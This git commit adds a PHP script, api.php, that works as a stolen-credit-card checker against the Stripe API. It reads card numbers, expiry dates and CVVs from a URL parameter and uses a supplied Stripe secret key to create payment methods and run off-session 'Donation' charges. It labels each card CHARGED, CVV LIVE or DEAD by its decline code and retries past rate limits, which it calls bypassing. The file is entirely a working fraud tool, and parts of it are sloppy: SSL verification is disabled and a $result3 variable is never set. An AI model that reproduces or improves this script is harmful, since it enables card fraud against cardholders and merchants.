bc9b59b0f329401d9e2f20bdae2e2d3de830be58
Ahmed Afnan <adilbanana@outlook.com>
2023-01-16 13:40:35 +0600

    Add files via upload

---
+++ api.php
@@ -0,0 +1,373 @@
+<?php
+
+
+//===================== [ RE-CODE BY AFN4NX ] ====================//
+#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#
+
+
+
+error_reporting(0);
+date_default_timezone_set('America/Buenos_Aires');
+
+
+//================ [ FUNCTIONS & LISTA ] ===============//
+
+function GetStr($string, $start, $end){
+    $string = ' ' . $string;
+    $ini = strpos($string, $start);
+    if ($ini == 0) return '';
+    $ini += strlen($start);
+    $len = strpos($string, $end, $ini) - $ini;
+    return trim(strip_tags(substr($string, $ini, $len)));
+}
+
+
+function multiexplode($seperator, $string){
+    $one = str_replace($seperator, $seperator[0], $string);
+    $two = explode($seperator[0], $one);
+    return $two;
+    };
+
+if(isset($_GET['cst'])){
+
+$amt = $_GET['cst'];
+}
+if(empty($amt)) {
+    $amt = '1';
+}
+    $chr = $amt * 100;
+
+$idd = $_GET['idd'];
+
+$sk = $_GET['sec'];
+$lista = $_GET['lista'];
+    $cc = multiexplode(array(":", "|", ""), $lista)[0];
+    $mes = multiexplode(array(":", "|", ""), $lista)[1];
+    $ano = multiexplode(array(":", "|", ""), $lista)[2];
+    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
+
+if (strlen($mes) == 1) $mes = "0$mes";
+if (strlen($ano) == 2) $ano = "20$ano";
+
+
+
+
+
+//================= [ CURL REQUESTS ] =================//
+
+#-------------------[1st REQ]--------------------#  
+$x = 0;  
+while(true)  
+{  
+$ch = curl_init();  
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
+curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.''); 
+$result1 = curl_exec($ch);  
+$tok1 = Getstr($result1,'"id": "','"');  
+$msg = Getstr($result1,'"message": "','"');  
+//echo "<br><b>Result1: </b> $result1<br>";  
+if (strpos($result1, "rate_limit"))   
+{  
+    $x++;  
+    continue;  
+}  
+break;  
+}  
+  
+  
+#------------------[2nd REQ]--------------------#  
+$x = 0;  
+while(true)  
+{  
+$ch = curl_init();  
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
+curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=ITSSWAGGER Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+$result2 = curl_exec($ch);  
+$tok2 = Getstr($result2,'"id": "','"');  
+$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
+//echo "<br><b>Result2: </b> $result2<br>";  
+if (strpos($result2, "rate_limit"))   
+{  
+    $x++;  
+    continue;  
+}  
+break;  
+}
+
+//=================== [ RESPONSES ] ===================//
+
+if(strpos($result2, '"seller_message": "Payment complete."' )) {
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' Charged ✅ <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+}
+elseif(strpos($result2,'"cvc_check": "pass"')){
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
+}
+if(strpos($result3, '"seller_message": "Payment complete."' )) {
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: €'.$amt.' Charged ✅ <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+}
+elseif(strpos($result3,'"cvc_check": "pass"')){
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
+}
+
+elseif(strpos($result1, "generic_decline")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
+}
+elseif(strpos($result2, "generic_decline")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
+}
+elseif(strpos($result3, "generic_decline")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
+}
+elseif(strpos($result1, "insufficient_funds" )) {
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';
+}
+elseif(strpos($result2, "insufficient_funds" )) {
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';
+}
+elseif(strpos($result3, "insufficient_funds" )) {
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';
+}
+elseif(strpos($result1, "fraudulent" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
+}
+elseif(strpos($result2, "fraudulent" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
+}
+elseif(strpos($result3, "fraudulent" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
+}
+elseif(strpos($result1, "do_not_honor" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
+}
+elseif(strpos($result2, "do_not_honor" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
+}
+elseif(strpos($result3, "do_not_honor" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
+}
+elseif(strpos($result1,'"code": "incorrect_cvc"')){
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+}
+elseif(strpos($result2,'"code": "incorrect_cvc"')){
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+}
+elseif(strpos($result3,'"code": "incorrect_cvc"')){
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+}
+elseif(strpos($result1,' "code": "invalid_cvc"')){
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+}
+elseif(strpos($result2,' "code": "invalid_cvc"')){
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+}
+elseif(strpos($result3,' "code": "invalid_cvc"')){
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+}
+elseif(strpos($result1,"invalid_expiry_month")){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD EXPIRY MONTH</span><br>';
+}
+elseif(strpos($result2,"invalid_expiry_month")){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD EXPIRY MONTH</span><br>';
+}
+elseif(strpos($result3,"invalid_expiry_month")){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD EXPIRY MONTH</span><br>';
+}
+elseif(strpos($result1,"invalid_account")){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD ACCOUNT</span><br>';
+}
+elseif(strpos($result2,"invalid_account")){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD ACCOUNT</span><br>';
+}
+elseif(strpos($result3,"invalid_account")){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD ACCOUNT</span><br>';
+}
+elseif(strpos($result1, "lost_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
+}
+elseif(strpos($result2, "lost_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
+}
+elseif(strpos($result3, "lost_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
+}
+elseif(strpos($result1, "stolen_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
+}
+elseif(strpos($result2, "stolen_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
+}
+elseif(strpos($result3, "stolen_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
+}
+elseif(strpos($result1, "transaction_not_allowed" )) {
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED</span><br>';
+}
+elseif(strpos($result2, "transaction_not_allowed" )) {
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED</span><br>';
+}
+elseif(strpos($result3, "transaction_not_allowed" )) {
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED</span><br>';
+}
+elseif(strpos($result1, "card_error_authentication_required")) {
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
+} 
+elseif(strpos($result2, "card_error_authentication_required")) {
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
+}
+elseif(strpos($result3, "card_error_authentication_required")) {
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
+}
+elseif(strpos($result1, "pickup_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
+}
+elseif(strpos($result2, "pickup_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
+}
+elseif(strpos($result3, "pickup_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
+}
+elseif(strpos($result1, 'Your card has expired.')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
+}
+elseif(strpos($result2, 'Your card has expired.')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
+}
+elseif(strpos($result3, 'Your card has expired.')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
+}
+elseif(strpos($result1, "card_decline_rate_limit_exceeded")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CC CHECK EXEDED</span><br>';
+}
+elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CC CHECK EXEDED</span><br>';
+}
+elseif(strpos($result3, "card_decline_rate_limit_exceeded")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result:CC CHECK EXEDED</span><br>';
+}
+elseif(strpos($result1, '"code": "processing_error"')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
+}
+elseif(strpos($result1, ' "message": "Your card number is incorrect."')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
+}
+elseif(strpos($result2, '"code": "processing_error"')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
+}
+elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
+}
+elseif(strpos($result3, '"code": "processing_error"')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
+}
+elseif(strpos($result3, ' "message": "Your card number is incorrect."')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
+}
+elseif(strpos($result1, "incorrect_number")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
+}
+elseif(strpos($result2, "incorrect_number")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
+}
+elseif(strpos($result3, "incorrect_number")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
+}
+elseif(strpos($result1, 'Your card was declined.')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';
+}
+elseif(strpos($result2, 'Your card was declined.')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';
+}
+elseif(strpos($result3, 'Your card was declined.')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';
+}
+elseif(strpos($result1,'"cvc_check": "unchecked"')){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
+}
+elseif(strpos($result1,'"cvc_check": "fail"')){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : FAIL</span><br>';
+}
+elseif(strpos($result1, "card_not_supported")) {
+	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
+}
+elseif(strpos($result2,'"cvc_check": "unchecked"')){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
+}
+elseif(strpos($result2,'"cvc_check": "fail"')){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : FAIL</span><br>';
+}
+elseif(strpos($result2, "card_not_supported")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
+}
+elseif(strpos($result3,'"cvc_check": "unchecked"')){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
+}
+elseif(strpos($result3,'"cvc_check": "fail"')){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : FAIL</span><br>';
+}
+elseif(strpos($result3, "card_not_supported")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
+}
+elseif (strpos($result1,'Your card does not support this type of purchase.')) {
+    echo 'CVV</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
+}
+elseif (strpos($result2,'Your card does not support this type of purchase.')) {
+    echo 'CVV</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
+}
+elseif (strpos($result3,'Your card does not support this type of purchase.')) {
+    echo 'CVV</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
+}
+elseif (strpos($result1, "rate_limit")) {
+	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK IS AT RATE LIMIT</span><br>';
+}
+elseif (strpos($result2, "rate_limit")) {
+	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK IS AT RATE LIMIT</span><br>';
+}
+elseif (strpos($result3, "rate_limit")) {
+	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK IS AT RATE LIMIT</span><br>';
+}
+
+echo " BYPASSING: $x <br>";
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//===================== [ RE-CODE BY AFN4NX ] ====================//
+
+
+//echo "<br><b>Lista:</b> $lista<br>";
+//echo "<br><b>CVV Check:</b> $cvccheck<br>";
+//echo "<b>D_Code:</b> $dcode<br>";
+//echo "<b>Reason:</b> $reason<br>";
+//echo "<b>Risk Level:</b> $riskl<br>";
+//echo "<b>Seller Message:</b> $seller_msg<br>";
+
+//echo "<br><b>Result3: </b> $result2<br>";
+
+curl_close($ch);
+ob_flush();
+?>
